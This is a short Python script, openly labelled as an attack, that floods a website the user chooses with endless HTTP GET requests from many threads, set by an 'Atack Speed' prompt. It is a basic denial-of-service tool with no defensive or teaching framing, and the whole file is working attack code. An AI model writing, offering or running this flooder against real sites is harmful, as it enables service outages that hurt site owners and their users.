import requests
import threading

url = input("Website URL: (https://domain.com) ")
speed = int(input("Atack Speed: (threads) "))

def send_request():
    while True:
        response = requests.get(url)
        # You can add what you want to do with the result of the operation performed here.
        # As an example, response.we can print the text:
        print(response.text)

# You can create as many threads as you want. The more threads, the more requests it will send.
thread_count = speed
threads = []

for _ in range(thread_count):
    thread = threading.Thread(target=send_request)
    thread.daemon = True
    thread.start()
    threads.append(thread)

# Stop the program by pressing KeyboardInterrupt (CTRL + C) to terminate all threads.
try:
    while True:
        continue
except KeyboardInterrupt:
    print("Program durduruldu.")
